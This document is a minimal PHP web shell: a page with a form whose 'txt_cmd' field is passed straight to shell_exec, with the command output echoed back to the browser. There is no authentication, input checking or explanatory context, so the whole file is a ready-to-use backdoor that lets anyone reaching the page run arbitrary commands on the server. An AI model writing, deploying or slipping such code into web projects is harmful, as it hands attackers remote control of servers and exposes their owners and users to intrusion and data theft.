
<?php
	if(isset($_POST['btn_exec'])){
		$txt_cmd = $_POST['txt_cmd'];
		$output = shell_exec($txt_cmd);
		echo "<pre>$output</pre>";
	}
	
?>

<html>
	<body>
		<form method="POST">
			<input type="text" name="txt_cmd" placeholder="Enter Your cmd here..."/>
			<input type="submit" name="btn_exec" value="run">
		</form>
	</body>
</html>
